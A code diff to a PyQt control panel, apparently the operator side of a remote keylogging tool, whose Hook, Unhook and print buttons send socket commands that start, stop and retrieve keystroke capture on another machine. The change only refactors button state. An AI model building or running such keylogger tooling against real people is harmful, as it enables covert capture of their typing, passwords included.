@@ -34,18 +34,19 @@ class Keystroke(QWidget):
 
         hbox1 = QHBoxLayout()
 
-        self.hook_button = QPushButton('Hook')
-        self.hook_button.clicked.connect(self.hook)
-        self.unhook_button = QPushButton('Unhook')
-        self.unhook_button.setDisabled(True)
-        self.unhook_button.clicked.connect(self.unhook)
+        hook_button = QPushButton('Hook')
+        hook_button.clicked.connect(self.hook)
+        unhook_button = QPushButton('Unhook')
+        unhook_button.clicked.connect(self.unhook)
         print_button = QPushButton('In Phím')
         print_button.clicked.connect(self.print)
         delete_button = QPushButton('Xóa')
         delete_button.clicked.connect(self.delete)
 
-        hbox1.addWidget(self.hook_button)
-        hbox1.addWidget(self.unhook_button)
+        self.hooked = False
+
+        hbox1.addWidget(hook_button)
+        hbox1.addWidget(unhook_button)
         hbox1.addWidget(print_button)
         hbox1.addWidget(delete_button)
 
@@ -60,14 +61,14 @@ class Keystroke(QWidget):
         self.show()
 
     def hook(self):
-        self.socket.send(bytes('key_log_listening', 'utf-8'))
-        self.hook_button.setDisabled(True)
-        self.unhook_button.setDisabled(False)
+        if not self.hooked:
+            self.socket.send(bytes('key_log_listening', 'utf-8'))
+            self.hooked = True
 
     def unhook(self):
-        self.socket.send(bytes('key_log_stop_listening', 'utf-8'))
-        self.hook_button.setDisabled(False)
-        self.unhook_button.setDisabled(True)
+        if self.hooked:
+            self.socket.send(bytes('key_log_stop_listening', 'utf-8'))
+            self.hooked = False
 
     def print(self):
         self.socket.send(bytes('get_key_log', 'utf-8'))
